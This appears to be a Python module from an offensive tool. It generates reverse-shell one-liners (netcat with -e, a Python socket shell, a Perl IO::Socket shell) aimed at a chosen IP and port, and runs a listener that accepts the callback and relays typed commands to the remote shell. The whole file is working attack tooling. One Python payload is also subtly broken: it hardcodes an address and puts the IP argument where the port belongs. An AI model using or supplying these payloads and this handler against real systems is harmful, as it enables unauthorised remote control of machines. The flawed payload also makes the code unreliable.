import socket

def nc_reverse_shell_cmds(ip, port):
    return ["nc -e /bin/bash {} {}".format( ip, port ), "nc -e /bin/sh {} {}".format( ip, port ), "nc -c bash {} {}".format( ip, port )]


def python_reverse_shell_cmds(ip, port):
   return ['python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("11.12.13.14",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh"]);\''.format( ip, port ), 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash"]);\''.format( ip, port )]


def perl_reverse_shell_cmds(ip, port):
    return ['perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''.format( ip, port )]

def send_commands(c):
    while True:
        command=''
        while(command != 'exit'):
            try:
                command=input('$ ')
                c.send((command).encode('utf-8') + b"\n")
                print(c.recv(3048).decode('utf-8'))
            except KeyboardInterrupt:
                break
        else:
            if (command == 'exit'):
                break
            continue
        break
    c.close()


def setup_server(ip, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.settimeout(5.0)
    server.bind((ip, port))
    server.listen(1)
    return server

def communicate(server):
    try:
        client, addr = server.accept()
        print("{} connected".format( addr ))
        if healt_check(client):
            send_commands(client)
            server.close()
            return True
        return False
    except:
        return False



def healt_check(client):
    client.send("pwd".encode('utf-8') + b"\n")
    data = client.recv(3048).decode('utf-8')
    if not data: 
        return False
    return True
